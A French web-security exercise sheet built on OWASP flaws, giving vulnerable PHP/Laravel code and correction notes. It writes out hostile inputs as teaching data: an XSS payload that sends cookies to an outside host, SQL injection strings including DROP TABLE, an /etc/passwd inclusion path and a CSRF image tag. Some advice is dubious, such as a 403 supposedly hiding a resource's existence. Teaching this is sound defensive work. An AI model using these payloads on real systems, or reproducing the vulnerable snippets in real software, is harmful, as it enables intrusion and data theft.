# 10. Exercices OWASP

Vous êtes en charge de la sécurité d'une application Web. Pour améliorer la sécurité, votre responsable a commandé un audit de sécurité. L'auditeur a trouvé plusieurs failles de sécurité. Vous devez corriger ces failles.

Votre application est composée de HTML, CSS, JavaScript et PHP.

La suite de l'exercice vous demandera d'identifier les failles de sécurité et de les corriger.

## Mise en situation

Vous êtes en charge de la correction d'un problème de sécurité. Nous sommes dans la phase d'analyse, vous devez identifier un problème. Dans un premier temps, vous devez analyser les logs d'accès à votre application :

```text
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search?q=demo HTTP/1.0" 200 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8987 HTTP/1.0" 200 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8988 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8989 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8990 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8991 HTTP/1.0" 404 512
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /facture?id=8986 HTTP/1.0" 200 512
192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
```

Avez-vous identifié un problème de sécurité ? Si oui, lequel ?

À partir de l'analyse des logs, vous devez maintenant trouver où se trouve la faille dans le code source de votre application. Pour cela, vous avez à votre disposition les éléments suivants (code source projet Laravel) :

```bash
ls -l
app/
    Console/
    Exceptions/
    Http/
        Controllers/
            Auth/
            Controller.php
            HomeController.php
            FactureController.php
            AdminController.php
            UserController.php
        Middleware/
        Kernel.php
    Providers/
bootstrap/
config/
database/
public/
resources/
routes/
    api.php
    web.php
    server.php
storage/
tests/
```

```php
<?php
// Routeur de l'application

Route::get('/', 'HomeController@index');
Route::get('/search', 'HomeController@index');
Route::get('/facture', 'FactureController@index');
Route::get('/admin', 'AdminController@index');
// …
Route::get('/admin/users', 'UserController@index');
```

Quels sont les fichiers à analyser pour trouver la faille de sécurité ?

```php
<?php
// FactureController.php
class FactureController extends Controller
{
    public function index(Request $request)
    {
        $id = $request->input('id');
        $facture = Facture::find($id);
        if ($facture) {
            return view('facture', ['facture' => $facture]);
        }
        return abort(404);
    }

    private function checkIfUserCanAccessFacture($facture)
    {
        return $facture->user_id === Auth::id() 
    }

    private function throttleUserAccess(){
        return RateLimiter::for('facture')->hit(Auth::id());
    }
}
```

Modifier l'accès aux factures en utilisant les fonctions à votre disposition afin de corriger le problème de sécurité identifié.

??? question "Éléments de correction"

    **Identification de la faille dans les logs**

    L'adresse IP `192.168.1.4` effectue des requêtes successives sur `/facture?id=8986`, `8987`, `8988`… en incrémentant l'identifiant. C'est un signe d'énumération de ressources (**IDOR – Insecure Direct Object Reference**, OWASP A01 : Contrôle d'accès défaillant). L'utilisateur tente d'accéder à des factures qui ne lui appartiennent pas.

    **Fichiers à analyser**

    D'après le routeur, l'URL `/facture` est gérée par `FactureController.php`. C'est ce fichier qu'il faut analyser en priorité.

    **Correction du contrôleur**

    Les méthodes `checkIfUserCanAccessFacture()` et `throttleUserAccess()` sont définies mais **jamais appelées** dans `index()`. Il faut les utiliser :

    ```php
    <?php
    // FactureController.php
    class FactureController extends Controller
    {
        public function index(Request $request)
        {
            // Limite le nombre de requêtes (anti-énumération)
            $this->throttleUserAccess();

            $id = $request->input('id');
            $facture = Facture::find($id);

            // Vérifie que la facture existe ET appartient à l'utilisateur connecté
            if ($facture && $this->checkIfUserCanAccessFacture($facture)) {
                return view('facture', ['facture' => $facture]);
            }

            return abort(403); // Forbidden, pas 404 (ne pas révéler l'existence)
        }

        private function checkIfUserCanAccessFacture($facture)
        {
            return $facture->user_id === Auth::id();
        }

        private function throttleUserAccess()
        {
            return RateLimiter::for('facture')->hit(Auth::id());
        }
    }
    ```

    **Points clés :**
    - Retourner un **403** (Forbidden) plutôt qu'un 404 permet de ne pas confirmer l'existence de la ressource à l'attaquant.
    - La vérification d'appartenance (`checkIfUserCanAccessFacture`) doit systématiquement être effectuée côté serveur.
    - Le rate limiting (`throttleUserAccess`) ralentit les tentatives d'énumération.

## Authentification

L'entreprise vous demande de mettre en place un système d'authentification centralisé (SSO) pour l'ensemble de ses applications. Expliquer en quoi, la mise en place de ce système risque de réduire la sécurité de l'ensemble des applications.

Proposez une solution à cette problématique.

??? question "Éléments de correction"

    **Risque du SSO (Single Sign-On)**

    Le SSO crée un **point unique de défaillance** (*single point of failure*) : si le serveur d'authentification est compromis, **toutes** les applications du système le sont simultanément. Un attaquant qui vole un token SSO valide obtient un accès à l'ensemble du périmètre applicatif.

    Autres risques :
    - Vol de session / token JWT mal sécurisé : propagation immédiate à toutes les apps.
    - Attaque sur le fournisseur d'identité (IdP) : impact maximal.
    - Absence de révocation rapide des sessions en cas de compromission.

    **Solution recommandée : SSO + MFA**

    Combiner le SSO avec une **authentification multi-facteurs (MFA/2FA)** permet de compenser le risque. Même si le mot de passe est compromis, le second facteur bloque l'accès.

    Mesures complémentaires :
    - Mettre en place une **durée de vie courte** pour les tokens (access token ~15 min, refresh token révocable).
    - Utiliser des protocoles éprouvés : **OAuth 2.0 / OpenID Connect**.
    - Surveiller et logger toutes les authentifications via le SIEM.
    - Prévoir un **plan de reprise** en cas de défaillance du SSO (authentification locale de secours).

## Les logs

Expliquer en quoi les logs d'accès à une application peuvent être utiles pour identifier des problèmes de sécurité. Décrivez un cas concret où les logs permettraient d'identifier une faille de sécurité, indiquer si le traitement doit être manuel ou automatisé.

??? question "Éléments de correction"

    **Utilité des logs**

    Les logs d'accès enregistrent toutes les requêtes HTTP reçues par le serveur (IP source, méthode, URL, code de réponse, taille…). Ils permettent de :
    - Détecter des comportements anormaux (nombreuses requêtes depuis une même IP, scans de fichiers…).
    - Identifier des tentatives d'exploitation (injection SQL dans les paramètres GET, XSS…).
    - Reconstituer la chronologie d'une attaque a posteriori (forensique).
    - Déclencher des alertes automatiques (IDS/SIEM).

    **Cas concret : détection d'une attaque par énumération d'identifiants**

    ```
    192.168.1.4 - GET /facture?id=8986 → 200
    192.168.1.4 - GET /facture?id=8987 → 404
    192.168.1.4 - GET /facture?id=8988 → 404
    ...
    ```
    Une même IP effectue des centaines de requêtes en incrémentant un paramètre `id` : c'est une attaque IDOR. Le log permet d'identifier l'IP attaquante et de la bloquer au pare-feu.

    **Manuel ou automatisé ?**

    | Situation | Traitement recommandé |
    |---|---|
    | Analyse forensique après incident | Manuel |
    | Détection en temps réel d'une attaque en cours | **Automatisé** (SIEM, fail2ban, WAF) |
    | Audit périodique de sécurité | Mixte |

    Pour une production, le traitement doit être **automatisé** : un outil comme **fail2ban** peut lire les logs Apache/Nginx et bannir automatiquement les IP suspectes.

## Faille 0

Observer les logs d'accès à votre application :

```
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search.php?query=<script>document.location='http://192.168.1.4.com/?c='+document.cookie</script> HTTP/1.0" 200 512
192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
```

Les logs vous semblent-ils suspects ? Si oui, pourquoi ?

Corriger le code de la page `search.php` pour éviter cette faille.

```php

<?php
$query = $_GET['query'];
echo "Résultat de la recherche pour $query";
$pdo->prepare("SELECT * FROM articles WHERE title LIKE '%?%'");
$pdo->execute([$query]);
$result = $pdo->fetchAll(PDO::FETCH_ASSOC);

foreach ($result as $article) {
    echo "<h2>$article['title']</h2>";
    echo "<p>$article['content']</p>";
}
?>
```

??? question "Éléments de correction"

    **Analyse des logs**

    Oui, la ligne suivante est **très suspecte** :
    ```
    GET /search.php?query=<script>document.location='http://192.168.1.4.com/?c='+document.cookie</script>
    ```
    Il s'agit d'une tentative d'injection **XSS réfléchie** (Cross-Site Scripting). L'attaquant injecte un script JavaScript dans le paramètre `query` qui, si la page l'affiche sans échappement, sera exécuté dans le navigateur de la victime et enverra ses cookies à `192.168.1.4`. Le serveur a répondu **200** : la requête a été acceptée, ce qui suggère que la faille est exploitable.

    **Correction du code**

    Le code présente deux problèmes :
    1. `$query` est affiché directement sans échappement → **XSS**
    2. Le placeholder `?` dans `LIKE '%?%'` est mal utilisé (les `%` doivent être dans la valeur, pas autour du `?`) → **requête préparée incorrecte**

    ```php
    <?php
    // 1. Récupérer et assainir l'entrée utilisateur
    $query = htmlspecialchars($_GET['query'] ?? '', ENT_QUOTES, 'UTF-8');

    // 2. Afficher la valeur échappée (plus de XSS possible)
    echo "Résultat de la recherche pour " . $query;

    // 3. Corriger la requête préparée : les % font partie de la valeur liée
    $stmt = $pdo->prepare("SELECT * FROM articles WHERE title LIKE ?");
    $stmt->execute(['%' . $_GET['query'] . '%']);
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);

    foreach ($result as $article) {
        // 4. Échapper aussi les données issues de la base avant affichage
        echo "<h2>" . htmlspecialchars($article['title'], ENT_QUOTES, 'UTF-8') . "</h2>";
        echo "<p>" . htmlspecialchars($article['content'], ENT_QUOTES, 'UTF-8') . "</p>";
    }
    ?>
    ```

    **Points clés :**
    - `htmlspecialchars()` avec `ENT_QUOTES` et l'encodage `UTF-8` protège contre les XSS.
    - Les données issues de la base doivent **aussi** être échappées à l'affichage.
    - Le placeholder `?` dans une requête préparée PDO ne doit pas être entouré de `'` ni de `%`.

## Faille 1

L'auditeur a trouvé une faille de type XSS (Cross Site Scripting). Il a réussi à afficher une boîte de dialogue sur le navigateur de l'utilisateur.

Le code source ou la faille se trouve est le suivant :

```php
<?php
if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    echo "<h2>Bonjour $name</h2>";
    echo "<p>Votre email est $email</p>";
}
?>
<div class="container">
    <h1>Exercice 1</h1>
    <p>Vous devez corriger la faille XSS</p>
    <form action="index.php" method="post">
        <div class="form-group">
            <label for="name">Nom</label>
            <input type="text" class="form-control" id="name" name="name" placeholder="Nom">
        </div>
        <div class="form-group">
            <label for="email">Email</label>
            <input type="email" class="form-control" id="email" name="email" placeholder="Email">
        </div>
        <button type="submit" class="btn btn-primary">Envoyer</button>
    </form>
</div>
```

::: tip Rappel

Filtrer les entrées utilisateur avec la fonction `htmlspecialchars()`. Cette fonction permet de convertir les caractères spéciaux en entités HTML.

Exemple :

```php
// Échappe les caractères spéciaux. C'est à dire que les caractères spéciaux seront convertis en entités HTML.
$name = htmlspecialchars($_POST['name']);
```

Autre solution, utiliser la fonction `strip_tags()`. Cette fonction permet de supprimer les balises HTML.

Exemple :

```php
// Supprime les balises HTML
$name = strip_tags($_POST['name']);
```

:::

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    Les variables `$name` et `$email` sont affichées directement dans la page sans aucun traitement. Un attaquant peut soumettre le formulaire avec la valeur :
    ```
    <script>alert('XSS')</script>
    ```
    Ce script sera interprété par le navigateur → **XSS réfléchie**.

    **Correction avec `htmlspecialchars()`**

    ```php
    <?php
    if (isset($_POST['name']) && isset($_POST['email'])) {
        // Échapper les caractères spéciaux avant tout affichage
        $name  = htmlspecialchars($_POST['name'],  ENT_QUOTES, 'UTF-8');
        $email = htmlspecialchars($_POST['email'], ENT_QUOTES, 'UTF-8');

        echo "<h2>Bonjour $name</h2>";
        echo "<p>Votre email est $email</p>";
    }
    ?>
    ```

    **Alternative avec `strip_tags()`**

    ```php
    $name  = strip_tags($_POST['name']);
    $email = strip_tags($_POST['email']);
    ```

    **Différence entre les deux approches :**
    | Fonction | Comportement | Usage conseillé |
    |---|---|---|
    | `htmlspecialchars()` | Convertit `<` en `&lt;` etc. (le texte reste intact) | Affichage HTML |
    | `strip_tags()` | Supprime toutes les balises HTML | Quand le HTML n'est pas du tout attendu |

    Pour un champ email, on peut également valider le format avec `filter_var($email, FILTER_VALIDATE_EMAIL)`.

## Faille 1.1 : Les Guards / Middleware

L'auditeur vous demande d'observer le code PHP suivant :

```php
<?php
// Routeur de l'application

Route::get('/', 'HomeController@index');
Route::get('/search', 'HomeController@index');
Route::get('/facture', 'FactureController@index');

Route::middleware(['admin'])->group(function () {
    Route::get('/admin', 'AdminController@index');
    // …
    Route::get('/admin/users', 'UserController@index');
});
```

Il vous demande d'expliquer le rôle du guard / middleware `admin` ?

À la suite de cette question, il vous demande de faire en sorte d'ajouter la page `/admin/factures` qui permettra d'afficher les factures de l'ensemble des utilisateurs. Celle-ci ne doit être accessible qu'aux utilisateurs ayant le rôle `admin`.

La route `/admin/factures` doit appeler la méthode `FactureController@all`.

Proposez une solution permettant de mettre en place cette fonctionnalité.

??? question "Éléments de correction"

    **Rôle du middleware `admin`**

    Un middleware (ou guard) est un **filtre intermédiaire** qui s'exécute avant le contrôleur. Le middleware `admin` vérifie que l'utilisateur connecté possède le rôle `admin`. Si ce n'est pas le cas, il redirige vers une page d'erreur (403) ou vers la page de connexion. Il protège ainsi tout le groupe de routes `/admin/*` sans dupliquer la logique de vérification dans chaque contrôleur.

    **Ajout de la route `/admin/factures`**

    Il suffit d'ajouter la nouvelle route **à l'intérieur** du groupe middleware `admin` :

    ```php
    <?php
    // Routeur de l'application

    Route::get('/', 'HomeController@index');
    Route::get('/search', 'HomeController@index');
    Route::get('/facture', 'FactureController@index');

    Route::middleware(['admin'])->group(function () {
        Route::get('/admin', 'AdminController@index');
        Route::get('/admin/users', 'UserController@index');
        // Nouvelle route protégée par le middleware admin
        Route::get('/admin/factures', 'FactureController@all');
    });
    ```

    **Méthode à créer dans `FactureController`**

    ```php
    public function all()
    {
        // Récupère toutes les factures, tous utilisateurs confondus
        $factures = Facture::all();
        return view('admin.factures', ['factures' => $factures]);
    }
    ```

    **Point clé :** placer la route dans le groupe middleware garantit que la vérification du rôle est centralisée et ne peut pas être oubliée. Ne jamais vérifier le rôle uniquement côté vue (JavaScript / HTML) — la vérification doit **toujours** être côté serveur.

## Faille 2

L'auditeur a trouvé une faille de type Injection SQL. Il a réussi à afficher les données de la base de données.

Le code source ou la faille se trouve est le suivant :

```php
<?php

$id = $_GET['id'];
$request = "SELECT * FROM users WHERE id = $id";
$result = $pdo->query($request);
$user = $result->fetch(PDO::FETCH_ASSOC);
?>

<div class="container">
    <h1>Exercice 2</h1>
    <p>Vous devez corriger la faille d'injection SQL</p>
    <p>Voici les informations de l'utilisateur</p>
    <ul>
        <li>Nom : <?= $user['name'] ?></li>
        <li>Email : <?= $user['email'] ?></li>
    </ul>
</div>

<p>
    Voici la liste des utilisateurs :
</p>

-  <a href="index.php?id=1">Utilisateur 1</a>
-  <a href="index.php?id=2">Utilisateur 2</a>

```

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    La valeur de `$_GET['id']` est concaténée directement dans la requête SQL sans aucune validation. Un attaquant peut passer :
    ```
    ?id=1 OR 1=1
    ?id=1 UNION SELECT username, password FROM users--
    ```
    Cela permet d'extraire l'intégralité de la base de données (**OWASP A03 : Injection**).

    **Correction avec une requête préparée**

    ```php
    <?php
    // Valider que l'id est bien un entier
    $id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

    if ($id === false || $id === null) {
        // Identifiant invalide, on arrête
        http_response_code(400);
        exit('Identifiant invalide');
    }

    // Requête préparée : le paramètre est lié, jamais concaténé
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$id]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    ?>
    ```

    **Points clés :**
    - Ne **jamais** concaténer une entrée utilisateur dans une requête SQL.
    - Utiliser les **requêtes préparées** (`prepare` + `execute`) : le moteur SQL sépare le code des données.
    - Valider le type attendu (`FILTER_VALIDATE_INT`) en amont pour rejeter toute valeur non entière.

## Faille 2 variante

L'auditeur a trouvé une faille de type Injection SQL. Observer le code source suivant :

```php
<?php

$id = $_GET['id'];
$request = "SELECT * FROM users WHERE id = $id";
$pdo->prepare($request)->execute();
$user = $pdo->fetch(PDO::FETCH_ASSOC);
?>

<div class="container">
    <h1>Exercice 2</h1>
    <p>Vous devez corriger la faille d'injection SQL</p>
    <p>Voici les informations de l'utilisateur</p>
    <ul>
        <li>Nom : <?= $user['name'] ?></li>
        <li>Email : <?= $user['email'] ?></li>
    </ul>
</div>

?>
```

Pourquoi le code source est-il vulnérable à une injection SQL ? Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Pourquoi est-ce vulnérable malgré `prepare()` ?**

    Utiliser `prepare()` n'est **pas suffisant** si la requête contient une concaténation directe. Ici, `$id` est injecté dans la chaîne SQL **avant** que PDO ne la traite. PDO prépare une requête déjà corrompue. L'appel à `execute()` sans paramètre liés n'offre aucune protection.

    La préparation protège uniquement quand les données sont transmises **via les paramètres liés** (`?` ou `:param`).

    **Correction**

    ```php
    <?php
    $id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

    if (!$id) {
        http_response_code(400);
        exit('Identifiant invalide');
    }

    // La valeur est passée en paramètre lié, pas dans la chaîne SQL
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$id]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    ?>
    ```

    **Règle à retenir :** `prepare()` sans paramètre lié ne protège pas contre les injections SQL. Les données utilisateur doivent toujours être transmises via `execute([$valeur])` ou `bindParam()`.

## Faille 3

L'auditeur a trouvé une faille de type CSRF (Cross Site Request Forgery). Il a réussi via un email à faire supprimer des utilisateurs par l'administrateur de la plateforme.

Le code source ou la faille se trouve est le suivant :

```php

<?php
if(isset($_GET['id'])) {
    $request = "DELETE FROM user WHERE id = ?";
    $pdo->prepare($request)->execute([$_GET['id']]);
}
?>

<div class="container">
    <h1>Exercice 3</h1>
    <p>Vous devez corriger la faille CSRF</p>
    <p>Voici la liste des utilisateurs :</p>
    <ul>
        <li>Utilisateur 1 <a href="index.php?id=1">Supprimer</a></li>
        <li>Utilisateur 2 <a href="index.php?id=2">Supprimer</a></li>
    </ul>
</div>
```

::: tip Rappel

Le principe de la faille CSRF est de faire une requête à l'insu de l'utilisateur. Pour cela, il faut que l'utilisateur soit connecté à votre application. Ensuite, vous devez faire une requête à l'insu de l'utilisateur.

Pour corriger cette faille, vous devez ajouter un token dans le formulaire (ou en SESSION). Ce token doit être généré aléatoirement et doit être vérifié lors de l'accès à la page.

```php
// Génère un token aléatoire
$_SESSION['token'] = bin2hex(random_bytes(32));

// Vérifier le token
if (isset($_POST['token']) && $_POST['token'] === $_SESSION['token']) {
    // Le token est valide, nous pouvons traiter la requête
    // ...
}
```
:::

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    La suppression s'effectue via une **requête GET** (`href="index.php?id=1"`). Un attaquant peut envoyer à l'administrateur un email contenant un lien ou une image comme :
    ```html
    <img src="https://monsite.com/index.php?id=1">
    ```
    Le navigateur de l'admin charge l'image → la suppression est déclenchée à son insu.

    Deux problèmes cumulés :
    1. Une action destructrice (DELETE) ne doit **jamais** être déclenchée par un GET.
    2. Absence de token CSRF.

    **Correction**

    ```php
    <?php
    session_start();

    // Générer le token CSRF à l'affichage de la page
    if (empty($_SESSION['token'])) {
        $_SESSION['token'] = bin2hex(random_bytes(32));
    }

    // Traitement de la suppression uniquement en POST avec token valide
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['id'], $_POST['token'])) {
        if (hash_equals($_SESSION['token'], $_POST['token'])) {
            // Consommer le token (usage unique)
            unset($_SESSION['token']);

            $stmt = $pdo->prepare("DELETE FROM user WHERE id = ?");
            $stmt->execute([$_POST['id']]);
        }
    }
    ?>

    <div class="container">
        <h1>Exercice 3</h1>
        <p>Voici la liste des utilisateurs :</p>
        <ul>
            <li>
                Utilisateur 1
                <!-- Formulaire POST avec token CSRF caché -->
                <form method="post" action="index.php">
                    <input type="hidden" name="id" value="1">
                    <input type="hidden" name="token" value="<?= $_SESSION['token'] ?>">
                    <button type="submit">Supprimer</button>
                </form>
            </li>
        </ul>
    </div>
    ```

    **Points clés :**
    - Utiliser **POST** (jamais GET) pour les actions qui modifient des données.
    - Utiliser `hash_equals()` plutôt que `===` pour comparer les tokens (résistant aux attaques temporelles).
    - Invalider le token après usage (**token à usage unique**).

## Faille 4

L'auditeur a trouvé une faille de type Inclusion de fichier. Il a réussi à afficher le contenu du fichier `config.php`.

Le code source ou la faille se trouve est le suivant :

```php

<?php
include $_GET['page'] . '.php';

// Exemple : index.php?page=config
?>
```

::: tip Rappel

Pour corriger cette faille, vous devez limiter les fichiers qui peuvent être inclus. Par exemple, vous pouvez créer un tableau avec les fichiers autorisés.

:::

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    `include` avec un paramètre GET non filtré constitue une **LFI (Local File Inclusion)**. Un attaquant peut accéder à n'importe quel fichier `.php` du serveur :
    ```
    ?page=config         → inclut config.php (identifiants BDD)
    ?page=../../../etc/passwd  → avec manipulation de chemin (si pas d'extension forcée)
    ```

    **Correction : liste blanche de pages autorisées**

    ```php
    <?php
    // Liste des pages autorisées (liste blanche)
    $pagesAutorisees = ['accueil', 'contact', 'apropos'];

    $page = $_GET['page'] ?? 'accueil';

    // Vérifier que la page demandée est dans la liste
    if (!in_array($page, $pagesAutorisees, true)) {
        // Page non autorisée : on redirige vers l'accueil ou on renvoie une 404
        http_response_code(404);
        $page = '404';
    }

    include $page . '.php';
    ?>
    ```

    **Points clés :**
    - Toujours utiliser une **liste blanche** (les valeurs autorisées), jamais une liste noire.
    - Le paramètre `true` dans `in_array()` active la comparaison stricte (type + valeur).
    - Ne jamais construire un chemin de fichier directement depuis une entrée utilisateur.

## Faille 5

L'auditeur a trouvé une faille de type bruteforce.

Le code source ou la faille se trouve est le suivant :

```php
<?php

if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if ($password === '123456') {
        echo "<p>Vous êtes connecté</p>";
    } else {
        echo "<p>Mot de passe incorrect</p>";
    }
}

?>

<form method="post">
    <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" class="form-control" id="password" name="password" placeholder="Mot de passe">
    </div>
    <button type="submit" class="btn btn-primary">Envoyer</button>
</form>
```

::: tip Rappel

Pour corriger cette faille, plusieurs solutions sont possibles :

- Limiter le nombre de tentatives de connexion (par exemple 3 tentatives).
- Ajouter un token CSRF dans le formulaire. (voir faille 3)
- Ajouter un délai entre chaque tentative de connexion. (exemple : 1 seconde)

L'objectif est de limiter le nombre de tentatives de connexion. L'objectif est de ralentir l'attaque brute force.

:::

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    Le formulaire accepte un nombre illimité de tentatives sans délai ni blocage. Un attaquant peut automatiser des milliers d'essais (attaque **brute force** ou par dictionnaire).

    Par ailleurs, le mot de passe `123456` est un mot de passe extrêmement faible.

    **Correction : limitation des tentatives en session**

    ```php
    <?php
    session_start();

    // Initialiser le compteur de tentatives
    if (!isset($_SESSION['tentatives'])) {
        $_SESSION['tentatives'] = 0;
    }

    $maxTentatives = 3;
    $messageErreur = '';

    if (isset($_POST['password'])) {

        // Bloquer si trop de tentatives
        if ($_SESSION['tentatives'] >= $maxTentatives) {
            $messageErreur = "Compte temporairement bloqué. Réessayez plus tard.";
        } else {
            $_SESSION['tentatives']++;

            // Ajouter un délai pour ralentir les attaques automatisées
            sleep(1);

            $password = $_POST['password'];
            if ($password === '123456') {
                // Réinitialiser le compteur en cas de succès
                $_SESSION['tentatives'] = 0;
                echo "<p>Vous êtes connecté</p>";
            } else {
                $messageErreur = "Mot de passe incorrect. Tentative " 
                    . $_SESSION['tentatives'] . "/$maxTentatives";
            }
        }
    }
    ?>

    <?php if ($messageErreur): ?>
        <p style="color:red"><?= htmlspecialchars($messageErreur) ?></p>
    <?php endif; ?>

    <form method="post">
        <input type="password" name="password" placeholder="Mot de passe">
        <button type="submit">Envoyer</button>
    </form>
    ```

    **Solutions complémentaires à combiner :**
    - **Token CSRF** pour empêcher le rejeu automatisé de requêtes.
    - **CAPTCHA** après N tentatives échouées.
    - **Délai exponentiel** : 1s, 2s, 4s… entre les tentatives.
    - Stocker le compteur en base de données (plutôt qu'en session) pour résister au changement de session.

## Faille 6

L'attaquant a trouvé une faille de type manque de contrôle d'accès. Il a réussi à accéder à une page qui n'est pas accessible aux utilisateurs.

Le code source ou la faille se trouve est le suivant :

```php

// Routeur de l'application

<?php

Route::get('/', 'HomeController@index');
Route::get('/admin', 'AdminController@index');
// …
Route::get('/admin/users', 'UserController@index');

```

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Nature de la faille**

    Les routes `/admin` et `/admin/users` sont accessibles à **tous les utilisateurs**, connectés ou non. Il n'y a aucun contrôle d'accès (**OWASP A01 : Broken Access Control**).

    **Correction avec un middleware d'authentification et de rôle**

    ```php
    <?php
    // Routeur de l'application

    Route::get('/', 'HomeController@index');

    // Groupe protégé : authentification requise + rôle admin
    Route::middleware(['auth', 'admin'])->group(function () {
        Route::get('/admin', 'AdminController@index');
        Route::get('/admin/users', 'UserController@index');
    });
    ```

    **Exemple de middleware `admin` (Laravel) :**

    ```php
    <?php
    // app/Http/Middleware/AdminMiddleware.php

    class AdminMiddleware
    {
        public function handle(Request $request, Closure $next)
        {
            if (!Auth::check() || Auth::user()->role !== 'admin') {
                abort(403, 'Accès refusé');
            }
            return $next($request);
        }
    }
    ```

    **Points clés :**
    - `auth` vérifie que l'utilisateur est **connecté**.
    - `admin` vérifie qu'il possède le **rôle admin**.
    - Ces deux vérifications sont indépendantes et cumulables.
    - Toujours protéger les routes sensibles côté **serveur**, jamais uniquement en masquant des liens dans le HTML.

## Faille 7

Identifiez les failles de sécurité dans le code source suivant :

```php
<?php

if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $request = "INSERT INTO users (name, email) VALUES ('$name', '$email')";
    $pdo->exec($request);
}
?>
```

Proposez une solution pour corriger cette faille.

??? question "Éléments de correction"

    **Failles identifiées**

    1. **Injection SQL** : `$name` et `$email` sont concaténés directement dans la requête SQL. Un attaquant peut saisir `'; DROP TABLE users; --` pour détruire la base.
    2. **Absence de validation / assainissement** : aucune vérification du format de l'email, aucun échappement.
    3. **XSS potentielle** : si ces données sont réaffichées dans une page sans échappement.

    **Correction**

    ```php
    <?php
    if (isset($_POST['name']) && isset($_POST['email'])) {
        // 1. Assainir les entrées
        $name  = htmlspecialchars(trim($_POST['name']),  ENT_QUOTES, 'UTF-8');
        $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);

        // 2. Valider l'email
        if ($email === false) {
            exit('Adresse email invalide');
        }

        // 3. Requête préparée (protège contre l'injection SQL)
        $stmt = $pdo->prepare("INSERT INTO users (name, email) VALUES (?, ?)");
        $stmt->execute([$name, $email]);
    }
    ?>
    ```

    **Points clés :**
    - `FILTER_VALIDATE_EMAIL` valide **et** assainit l'email en une seule opération.
    - La requête préparée rend l'injection SQL **impossible**.
    - `htmlspecialchars()` protège contre une éventuelle réaffichage XSS ultérieur.

## Faille 8

Identifiez les failles de sécurité dans le code source suivant :

```php
<?php

if (isset($_POST['name']) && isset($_POST['email'])) {
    $name = $_POST['name'];
    $email = $_POST['email'];
    $request = "INSERT INTO users (name, email) VALUES ('?', '?')";
    $pdo->prepare($request)->execute([$name, $email]);
}

?>
```

Proposez une solution pour corriger cette faille.

::: tip Rappel

Filtrer une saisie utilisateur :

- `htmlspecialchars()` : Convertit les caractères spéciaux en entités HTML.
- `strip_tags()` : Supprime les balises HTML.
- `filter_input()` : Filtre une variable avec un filtre spécifique.
  - `FILTER_SANITIZE_STRING` : Supprime les balises HTML et les caractères spéciaux.
  - `FILTER_SANITIZE_EMAIL` : Supprime les caractères illégaux dans un email.
  - `FILTER_SANITIZE_URL` : Supprime les caractères illégaux dans une URL.
  - `FILTER_SANITIZE_NUMBER_INT` : Supprime tous les caractères sauf les chiffres et le signe + et -.
  - Exemple : `filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);`
  - Exemple : `filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);`
  - Voir plus de filtres : [https://www.php.net/manual/fr/filter.filters.sanitize.php](https://www.php.net/manual/fr/filter.filters.sanitize.php)

:::

??? question "Éléments de correction"

    **Faille identifiée**

    Le placeholder PDO `?` est entouré de guillemets simples `'?'`. PDO interprète alors `'?'` comme une **chaîne littérale** et non comme un paramètre à lier. Les données de `execute()` ne sont pas utilisées et la requête est exécutée telle quelle, avec la chaîne `?` à la place des valeurs. La protection contre l'injection SQL est **inexistante**.

